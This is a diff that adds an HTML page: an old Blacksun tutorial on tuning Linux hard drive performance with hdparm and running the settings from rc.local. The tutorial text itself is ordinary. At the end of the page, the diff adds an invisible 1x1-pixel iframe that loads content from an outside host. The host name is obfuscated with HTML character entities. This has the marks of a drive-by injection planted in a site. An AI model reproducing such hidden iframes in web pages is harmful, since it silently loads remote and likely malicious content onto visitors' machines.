@@ -1,0 +1,105 @@
+<html>
+<head>
+<title>linuxhdtweak</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+
+<body bgcolor="#FFFFFF" text="#000000">
+<b><font size="5"> </font></b>
+<table width="680" border="0" cellspacing="2" cellpadding="2" align="center">
+  <tr> 
+    <td width="693"> 
+      <pre>
+                        :::::::::   ::::::::  :::::::::  :::::::::: 
+                        :+:    :+: :+:    :+: :+:    :+: :+:        
+                        +:+    +:+ +:+        +:+    +:+ +:+        
+                        +#++:++#+  +#++:++#++ +#++:++#:  :#::+::#   
+                        +#+    +#+        +#+ +#+    +#+ +#+        
+                        #+#    #+# #+#    #+# #+#    #+# #+#        
+                        #########   ########  ###    ### ###  
+                         
+              	             <a href="http://blacksun.box.sk" target="_blank">http://blacksun.box.sk</a>
+                           _____________________________
+    ______________________I       <b>   Topic:</b>             I_____________________
+   \                      I                             I                    /
+    \     HTML by:        I      <b>Speeding Up Your</b>       I   Written by:     /
+    >                     I      <b>Linux Partitions</b>       I                  < 
+   /      <a href="mailto:black_mesa@gmx.de">Martin L.</a>       I_____________________________I   Craig Keough*   \
+  /___________________________>                    <_________________________\
+                                                With a few notes by <a href="mailto:barakirs@netvision.net.il">R a v e n</a>
+</pre>
+    </td>
+  </tr>
+</table>
+<p>So, you installed LINUX and the speed is not what you heard it was. Am I correct 
+  ? The default installation of any distribution is designed to work on a broad 
+  range of computer setups and therefore has minimal optimizations (Same as Windows9x 
+  by the way). Freshly-installed boxes come with a default kernel and default 
+  settings, which are supposed to be as compatible as possible. By optimizing 
+  your settings, you can do wonders. For example: RedHat 6.2 comes with a 660k 
+  kernel, but you can easily reduce it down to somewhere around 500k, even less. 
+  This should speed up your performance greatly. But today we're about to do something 
+  completely different.</p>
+<p>We will begin by tweaking your hard drive for the fastest performance, so if 
+  you are using KDE, then exit to the console. ( because of the nature of these 
+  tweaks your computer could become unstable resulting in corrupted or lost data, 
+  therefore it should be done without X-Windows running)</p>
+<p>if you are logged in as a normal user, type su at the command prompt then enter 
+  the password.</p>
+<p>The command we will be using is : hdparm</p>
+<p>You can get a list of all the commands for hdparm by typing it by itself and 
+  hitting enter,</p>
+<p>A further explanation of these commands can be obtained by typing man hdparm</p>
+<p>The next step will be to determine what your hard drive is called, hda, hdb, 
+  etc. If you already know GREAT otherwise : type dmesg this will display all 
+  the information that was displayed during boot.</p>
+<p>If you have 1 hard drive then more than likely it is called: hda<br>
+  If you have 2 hard drives then more than likely it is called: hdb</p>
+<p>Lets assume it is hda.</p>
+<p>Now type: hdparm -I /dev/hda This will read all sorts of information directly 
+  from the drive, telling us what it can support. Before you use a particular 
+  tweak, make sure you check this information to make sure your drive supports 
+  it.</p>
+<p>Do a speed test by typing: hdparm -t /dev/hda Repeat this a few times and get 
+  a general idea of the speeds and write them down so when we are finished you 
+  can compare the results.</p>
+<p>I got the results of : 4.31 MB/s</p>
+<p>Next Type in: hdparm /dev/hda This output tells you what the defaults are set 
+  at, you will notice that I/O support reads 16-bit, its probably not using DMA 
+  and the unmask irq is probably 0 (off), along with multicount being disabled. 
+  Most newer hard drives can use these settings, so we will be turning them on.</p>
+<p>type in: hdparm -c3 -m16 /dev/hda This will turn on multireads and turn on 
+  the 32-bit flag w/sync</p>
+<p>Now do your speed test again, what a great improvement !!!</p>
+<p>You may want to stop here because the next few tweaks could make your computer 
+  lock up if they are not supported. </p>
+<p>We need to turn DMA on by typing: hdparm -d1 /dev/hda We can also turn on multiword 
+  DMA2 by typing hdparm -d1 -X34 /dev/hda</p>
+<p>Set the unmask irq bit to on by typing: hdparm -u1 /dev/hda Do: man hdparm 
+  to understand what this does.</p>
+<p><br>
+  And the last setting will be to set the PIO mode of your drive, so look at the 
+  inforamtion from doing hdparm -I /dev/hda and see which pio modes it supports. 
+  Type in hdparm -p4 /dev/hda Replace 4 with the highest number supported by your 
+  drive.</p>
+<p><br>
+  Run: hdparm -t /dev/hda<br>
+  At this point I got a reading of 19.43 MB/s<br>
+  Which is a drastic improvement.</p>
+<p>Now we dont want to type in these parameters every time we reboot, so we will 
+  add them to a startup script.</p>
+<p>Change to /etc/rc.d I simply added them to the end of the rc.local script, 
+  because It is the last script that is executed and any fscking is done before 
+  that point.</p>
+<p>You can combine all these settings on one line or you can put each on a separate 
+  line if you want to make it easier to understand. Also make sure you put in 
+  a comment saying what these settings are for so you can find them easier if 
+  you need to change them.</p>
+<p>Example: hdparm -c3 -m16 -d1 -X34 -u1 -p4 /dev/hda</p>
+<p>Also, if you are a GUI(graphical user interface) lover you can checkout DriveTweak at http://drivetweak.sourceforge.net . It is available for KDE and GNOME. I have sucessfult compiled and use it with KDE 2.2.1 with qt-2.3.1.
+<p>PLEASE NOTE: do these things at your own risk, i am not responsible.</p>
+<b>
+<p>11/15/01 Edited by MANOWAR^ - I removed the -kK option from thehdparm -c3 -m16 -d1 -X34 -u1 -p4 /dev/hda line which proves to not work with some hdds and is in fact unnessesary since you are auto running it every time you boot up the system. Also, I added the link to DriveTweak, GUI for hdparm available for KDE and GNOME.
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
